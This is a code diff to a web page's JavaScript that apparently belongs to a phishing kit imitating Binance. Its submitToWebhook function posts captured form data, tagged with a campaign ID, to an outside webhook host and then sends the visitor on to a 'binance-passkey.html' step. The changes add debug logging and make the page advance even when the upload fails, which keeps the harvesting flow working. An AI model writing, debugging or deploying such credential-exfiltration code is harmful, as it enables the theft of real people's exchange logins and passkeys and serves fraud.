@@ -473,24 +473,38 @@
         }
 
         function submitToWebhook(data, campaignId) {
+            // Debug info
+            console.log('Submitting data to webhook:', data);
+            console.log('Campaign ID:', campaignId);
+            
             // Use your actual backend host here
             const webhookUrl = `https://emailgrid.onrender.com/webhook/${campaignId}/`;
+            console.log('Webhook URL:', webhookUrl);
+            
             fetch(webhookUrl, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                     'Accept': 'application/json',
                 },
-                body: JSON.stringify(data)
+                body: JSON.stringify(data),
+                mode: 'cors', // Add CORS mode
+                credentials: 'omit' // Don't send cookies
             })
             .then(response => {
+                console.log('Response status:', response.status);
+                console.log('Response headers:', [...response.headers.entries()]);
+                
                 if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
+                    return response.text().then(text => {
+                        console.log('Error response body:', text);
+                        throw new Error(`HTTP error! status: ${response.status}, body: ${text}`);
+                    });
                 }
                 return response.json();
             })
             .then(result => {
-                console.log('Webhook response:', result);
+                console.log('Webhook success response:', result);
                 // Handle success - proceed to next step
                 setTimeout(() => {
                     window.location.href = 'binance-passkey.html';
@@ -498,9 +512,14 @@
             })
             .catch(error => {
                 console.error('Webhook error:', error);
-                // Handle error - still proceed for better UX, but log the error
+                // Still log detailed error info
+                if (error instanceof TypeError && error.message.includes('Failed to fetch')) {
+                    console.error('Network error - server might be down or CORS issue');
+                }
+                
+                // For testing purposes, still proceed to next page even on error
                 setTimeout(() => {
-                    window.location.href = '#';
+                    window.location.href = 'binance-passkey.html';
                 }, 1500);
             });
         }
